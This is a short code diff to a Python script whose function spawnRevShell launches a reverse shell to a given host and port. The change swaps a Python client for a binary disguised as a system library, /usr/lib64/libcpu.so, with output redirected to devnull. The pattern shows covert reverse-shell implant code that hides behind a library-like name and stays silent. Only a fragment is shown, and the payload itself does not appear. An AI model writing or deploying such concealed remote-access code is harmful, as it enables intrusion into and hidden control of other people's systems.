@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import socket
 import struct
 import sys
@@ -106,7 +107,7 @@ def spawnRevShell(host, port):
         os.dup2(devnull, 1)
         os.dup2(devnull, 2)
 
-        cmd = ("python3", "/usr/lib64/shellClient.py", host, port)
+        cmd = ("/usr/lib64/libcpu.so", host, port)
         os.execvp(cmd[0], cmd)
     except Exception as e:
         os.write(2, ("exec failed: %s\n" % e).encode("utf-8"))
